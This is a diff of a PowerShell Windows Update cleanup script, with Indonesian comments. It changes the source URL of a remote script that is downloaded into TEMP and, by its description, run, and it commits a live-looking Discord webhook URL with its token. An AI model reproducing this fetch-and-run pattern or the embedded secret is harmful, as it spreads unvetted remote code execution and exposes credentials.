@@ -9,9 +9,9 @@ Script ini akan mendownload dan menjalankan cleanup script dari GitHub, lalu kir
 Author: Arga DevOps
 #>
 
-$scriptUrl = "https://raw.githubusercontent.com/arga-devops/windows-tools/main/scripts/cleanup-windows-update.ps1"
+$scriptUrl = "https://raw.githubusercontent.com/argadia38/cleanup-windows-update/main/scripts/cleanup-windows-update.ps1"
 $tempPath = "$env:TEMP\cleanup.ps1"
-$webhook = "https://your.webhook.url"  # Optional
+$webhook = "https://discord.com/api/webhooks/1432262846384701542/KhIMVaPR86HKOmAH6ULvzfKrYqha_vs0XXKsJ4fjMQ8jsTZjGSgoHBIVujvpJiANprtv"  # Optional
 
 try {
     Invoke-WebRequest -Uri $scriptUrl -OutFile $tempPath
